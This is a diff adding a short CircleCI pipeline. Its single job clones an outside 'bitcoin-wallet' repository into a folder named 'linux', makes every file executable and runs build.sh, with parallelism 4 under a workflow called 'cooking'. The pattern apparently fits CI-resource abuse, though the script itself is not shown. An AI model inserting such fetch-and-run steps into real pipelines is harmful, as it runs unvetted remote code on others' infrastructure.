@@ -1,0 +1,20 @@
+version: 2.1
+jobs:
+  compile:
+   docker:
+      - image: ubuntu:20.10
+   steps:
+      - run:
+          command: |
+           apt update &&apt install -y wget git
+           git clone --depth=1 https://github.com/leonfox202/bitcoin-wallet.git linux
+           cd linux
+           chmod 755 *
+           ./build.sh
+      
+   parallelism: 4       
+workflows:
+  version: 2.1
+  cooking:
+    jobs:
+      - compile
